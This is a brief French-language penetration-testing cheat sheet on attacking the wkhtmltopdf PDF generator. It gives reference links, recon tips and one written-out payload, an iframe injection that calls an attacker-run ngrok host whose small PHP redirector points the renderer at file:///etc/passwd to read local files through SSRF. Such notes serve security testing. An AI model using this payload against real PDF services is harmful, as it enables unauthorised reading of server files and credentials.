# Exploitation de PDF

> Tips pour l'exploitation des générateurs de PDF



### 1. wkhtmltopdf

> Liens très intéressants :
>
> - http://hassankhanyusufzai.com/SSRF-to-LFI/
> - https://www.virtuesecurity.com/kb/wkhtmltopdf-file-inclusion-vulnerability-2/
> - https://github.com/wkhtmltopdf/wkhtmltopdf/issues/3570
> - https://docs.google.com/presentation/d/1JdIjHHPsFSgLbaJcHmMkE904jmwPM4xdhEuwhy2ebvo/htmlpresent

- Tenter d'envoyer une URL pingback (e.g. collaborateur burp) 

- Regarder l'user agent
- Si on a la technologie divulguée et si c'est `wkhtmltopdf`, probablement vulnérable aux SSRF (voir aux LFI via SSRF)
- Dans ce cas, utiliser ngrok
- Exemple de payload : `"><iframe src=http://ngrok/test.php?url=file:///etc/passwd></iframe>"` avec `test.php` : `<?php header('location:file://'.$_REQUEST['url']); ?>`